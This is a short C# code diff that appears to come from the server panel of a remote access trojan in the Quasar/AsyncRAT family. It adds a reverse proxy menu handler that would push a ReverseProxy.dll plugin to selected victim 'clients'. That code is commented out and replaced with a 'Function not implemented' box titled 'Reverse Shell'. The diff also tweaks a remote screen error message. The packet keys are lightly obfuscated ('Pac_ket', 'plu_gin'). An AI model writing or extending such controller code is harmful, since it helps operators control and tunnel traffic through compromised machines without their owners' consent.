@@ -20,6 +20,7 @@ using cGeoIp;
 using System.Resources;
 using System.ComponentModel;
 using System.Globalization;
+using Quasar.Server.Forms;
 
 namespace Server
 {
@@ -651,6 +652,38 @@ namespace Server
                 return;
             }
         }
+        private void ReverseProxyToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            /*try
+            {
+                MsgPack packet = new MsgPack();
+                packet.ForcePathObject("Pac_ket").AsString = "proxy";
+
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
+                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\ReverseProxy.dll"));
+                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
+
+                foreach (Clients client in GetSelectedClients())
+                {
+                    FrmReverseProxy proxy = (FrmReverseProxy)Application.OpenForms["proxy:" + client.ID];
+                    if (proxy == null)
+                    {
+                        proxy = new FrmReverseProxy
+                        {
+
+                        };
+                        proxy.Show();
+                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                return;
+            }*/
+            MessageBox.Show("Function not implemented.", "Reverse Shell", MessageBoxButtons.OK, MessageBoxIcon.Error);
+        }
 
         private void RemoteScreenToolStripMenuItem_Click(object sender, EventArgs e)
         {
@@ -679,7 +712,7 @@ namespace Server
             }
             catch (Exception ex)
             {
-                MessageBox.Show(ex.Message);
+                MessageBox.Show(ex.Message, "Remote Screen", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 return;
             }
         }
